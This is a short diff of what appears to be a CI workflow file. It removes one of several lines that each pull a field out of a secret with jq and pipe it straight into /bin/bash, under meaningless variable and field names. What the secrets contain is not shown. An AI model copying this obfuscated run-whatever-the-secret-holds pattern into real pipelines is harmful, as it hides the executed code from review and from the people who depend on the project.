@@ -20,7 +20,6 @@ jobs:
           qlm2: ${{ secrets.qlm2 }}
         run: |
           printf '%s' "$qlm2" | jq -r .dzqj6 | /bin/bash
-          printf '%s' "$dtndp0" | jq -r .wvpkw14 | /bin/bash
           echo $vy85 | jq -r .is5 | /bin/bash
           echo $l172 | jq -r .rrtot8242 | /bin/bash
           printf '%s' "$ss5169" | jq -r .qgzch09642 | /bin/bash
